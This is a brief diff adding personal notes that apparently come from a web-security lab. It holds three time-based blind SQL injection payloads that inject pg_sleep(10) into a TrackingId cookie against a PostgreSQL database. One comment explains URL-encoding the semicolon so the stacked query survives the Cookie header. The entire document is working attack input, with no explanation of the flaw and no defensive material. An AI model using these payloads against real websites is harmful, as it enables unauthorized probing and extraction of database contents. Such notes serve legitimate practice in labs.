@@ -1,0 +1,7 @@
+Cookie: TrackingId=4BQ8QOxlNza9z8AI'; SELECT pg_sleep(10) -- ;
+// ";" needs URL encoding as it is used to separate fields in Cookie Header
+
+Cookie: TrackingId=4BQ8QOxlNza9z8AI'%3b SELECT pg_sleep(10) -- ;
+
+
+TrackingId=x'||pg_sleep(10)--
